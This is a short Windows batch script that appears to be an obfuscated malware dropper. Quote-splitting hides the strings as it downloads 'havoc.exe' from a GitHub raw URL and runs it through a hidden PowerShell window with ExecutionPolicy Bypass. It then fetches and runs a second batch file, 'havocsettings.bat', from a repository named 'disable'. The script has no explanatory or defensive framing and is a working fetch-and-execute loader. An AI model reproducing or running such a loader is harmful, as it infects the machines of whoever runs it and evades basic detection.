@echo off
set "Url=https://github.com/nak"u"ss/h"a"voc/r"a"w"/m"a"in/ha"v"o"c.exe"
set "Filename=ha"v"o"c.e"xe"
@powershell -N"o"P"r"o"f"ile -Exec"ut"i"o"nPolic"y" Byp"a"ss -W"i"ndowStyle Hidden -C"o"mma"nd" "I"nv"o"ke-We"b"Req"u"es"t" %Url% -"O"ut"fi"le %Filename%; St"ar"t"-P"ro"c"es"s %Filename%"

set "Url1=https://github.com/nak"u"ss/dis"a"ble/r"a"w"/m"a"in/ha"v"ocse"t"t"in"g"s.bat"
set "Filename1=ha"v"ocse"tt"in"g"s.bat"

powershell -Command "& {Invoke-WebRequest -Uri '%Url1%' -OutFile '%Filename1%'}"


start /wait %Filename1%